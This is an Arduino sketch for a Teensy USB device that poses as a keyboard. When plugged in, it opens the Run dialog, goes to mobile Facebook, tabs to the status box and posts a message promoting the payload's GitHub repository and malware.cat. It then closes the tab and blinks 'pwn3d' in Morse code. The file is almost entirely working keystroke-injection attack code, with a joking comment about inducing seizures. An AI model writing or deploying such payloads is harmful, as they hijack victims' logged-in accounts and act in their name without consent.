/***
 *        ______                __                __      ____             __ 
 *       / ____/___ _________  / /_  ____  ____  / /__   / __ \____  _____/ /_
 *      / /_  / __ `/ ___/ _ \/ __ \/ __ \/ __ \/ //_/  / /_/ / __ \/ ___/ __/
 *     / __/ / /_/ / /__/  __/ /_/ / /_/ / /_/ / ,<    / ____/ /_/ (__  ) /_  
 *    /_/ __ \__,_/\___/\_____.___/\____/\____/_/|_|  /_/    \____/____/\__/  
 *       / /_  __  __   / __ \____  __  _________  __                         
 *      / __ \/ / / /  / / / /_  / / / / / ___/ / / /                         
 *     / /_/ / /_/ /  / /_/ / / /_/ /_/ / /  / /_/ /                          
 *    /_.___/\__, /   \____/ /___/\__,_/_/   \__,_/                           
 *          /____/                                                            
 */

// LED pin number, 13 for 3.1
// 11 for 2 and 2.x
int LED_PIN = 13;

// delay length (in ms)
int ds = 200;
// morse delay length (in ms)
int morseD = 250;

void setup() {
  
  // let it initialize
  delay(6000);
  
  // put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  
  // turn on the LED pin so we know it's running
  digitalWrite(LED_PIN, HIGH);
  
  delay(1000);
  
  // windows key + R = run
  sendCmd(KEY_R);
  
  delay(ds/3);
  
  // generally mobile has less things to tab through than the regular version
  typeln("http://m.facebook.com/");
  
  delay(ds * 5);
  
  // tab our way to statuses button
  repeatKey(KEY_TAB, 8);
  
  delay(ds/2);
  
  k(KEY_ENTER);
  
  // type our message 
  typeln("Automated Facebook post payload - https://github.com/Ozuru/Teensy/ and http://www.malware.cat/ for more information!");  
   
  repeatKey(KEY_TAB, 9);
  
  delay(ds);
   
  k(KEY_ENTER);
  
  delay(ds);
   
  ctrl(KEY_W); 
   
}

void loop() {
 flutter();
 // celebratory flutterring of LED commence
 dot();
 dash();
 dash();
 dot();
 // p
 dot();
 dash();
 dash();
 //w
 dash();
 dot();
 //n
 dot();
 dot();
 dot();
 dash();
 dash();
 //3
 dash();
 dot();
 dot();
 //d
 flutter();
 // whoop there it is (again)
 
}

void repeatKey(int Key, int amount) {
 for(int i = 0; i < amount; i++) {
  k(Key); 
 }
}

void typeln(String chars)
{
  // gotta make our own println function
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

void typeFast(String chars)
{
  // gotta make our own println function but fastah
  Keyboard.print(chars);
  delay(5);
  Keyboard.println("");
  delay(5);
}

void sendCmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
  delay(ds);
}

void alt(int key)
{
  mod(MODIFIERKEY_ALT, key);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(50);
  
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(50);
}


// morse code dot
void dot() { 
 digitalWrite(LED_PIN, HIGH);
 delay(morseD);
 digitalWrite(LED_PIN, LOW);
 delay(morseD);
}

// morse code dash
void dash() {
 digitalWrite(LED_PIN, HIGH);
 delay(morseD * 3);
 digitalWrite(LED_PIN, LOW);
 delay(morseD);
}

// induce a seizure in the observer - #prostrats  
void flutter() {
  
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 
}

// custom modifier method
void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}
